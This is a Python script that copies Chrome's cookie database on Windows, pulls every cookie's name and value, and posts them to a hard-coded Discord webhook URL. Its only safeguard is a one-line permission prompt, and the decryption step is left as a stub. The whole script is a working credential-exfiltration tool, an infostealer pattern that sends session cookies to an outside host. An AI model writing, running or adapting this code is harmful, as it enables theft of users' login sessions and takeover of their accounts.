import os
import sqlite3
import shutil
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import base64
import requests

# Helper function to ask for permission
def ask_permission(permission_type):
    print(f"Do you allow the script to access {permission_type}? (y/n): ")
    user_input = input().strip().lower()
    return user_input == 'y'

# Function to decrypt Chrome's encrypted cookies (Windows example)
def decrypt_cookie(encrypted_value):
    # Decrypts Chrome cookies encrypted with Windows DPAPI (Data Protection API)
    # This is a placeholder for actual decryption, it needs to be implemented
    # based on Windows security API, which may require specific libraries like pywin32.
    try:
        # You would use `win32crypt` here for actual decryption in Windows
        # Example: win32crypt.CryptUnprotectData(encrypted_value)[1]
        return encrypted_value  # Returning the encrypted cookie as is for now
    except Exception as e:
        print(f"Error decrypting cookie: {e}")
        return encrypted_value

# Function to get cookies from Chrome's cookie store (Windows)
def get_chrome_cookies():
    cookie_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Cookies")

    if not os.path.exists(cookie_db_path):
        print("Cookies database not found!")
        return None

    # Create a temporary copy of the Cookies database since it is in use by Chrome
    temp_cookie_db = "temp_cookies.db"
    shutil.copy2(cookie_db_path, temp_cookie_db)

    # Connect to the copied SQLite database
    conn = sqlite3.connect(temp_cookie_db)
    cursor = conn.cursor()

    # Query to get cookies from the 'cookies' table
    cursor.execute("SELECT name, value, host_key, path, is_secure, expires_utc FROM cookies")
    cookies = cursor.fetchall()

    # Decrypt and format cookies
    decrypted_cookies = []
    for cookie in cookies:
        cookie_name, cookie_value, host_key, path, is_secure, expires_utc = cookie
        decrypted_cookie = {
            "name": cookie_name,
            "value": decrypt_cookie(cookie_value) if "encrypted" in cookie_value else cookie_value,
            "host": host_key,
            "path": path,
            "secure": is_secure
        }
        decrypted_cookies.append(decrypted_cookie)

    # Clean up and remove the temporary database file
    conn.close()
    os.remove(temp_cookie_db)

    return decrypted_cookies

# Main function to handle cookie access flow
def access_cookies():
    if ask_permission("cookies from your browser"):
        print("Accessing browser cookies...")
        cookies = get_chrome_cookies()
        if cookies:
            print(f"Extracted cookies: {cookies}")
            # You can now send the cookies to your Discord Webhook or use them further
            send_cookies_to_webhook(cookies)
        else:
            print("No cookies found or failed to extract.")
    else:
        print("Permission denied. Exiting cookie extraction.")

# Function to send extracted cookies to a Discord Webhook
def send_cookies_to_webhook(cookies):
    webhook_url = 'https://discord.com/api/webhooks/1330720300307845170/f2Xm40QZH2CNbI4hbL0FRr66hJjmU92DXbyDcp0Z970RbPL9H4Nd5WzY06xiF8nPGGMp'  # Your Discord webhook URL

    # Prepare the payload with cookie information
    data = {
        "content": "Here are the extracted browser cookies:",
        "embeds": [
            {
                "title": "Extracted Cookies",
                "description": "List of cookies extracted from Chrome:",
                "fields": [{"name": cookie["name"], "value": cookie["value"]} for cookie in cookies],
                "footer": {"text": "Cookie extraction bot"}
            }
        ]
    }

    headers = {
        'Content-Type': 'application/json'
    }

    # Send the data to the Discord webhook
    response = requests.post(webhook_url, json=data, headers=headers)

    if response.status_code == 200:
        print("Cookies successfully sent to webhook!")
    else:
        print(f"Failed to send cookies. HTTP Status Code: {response.status_code}")

if __name__ == "__main__":
    access_cookies()
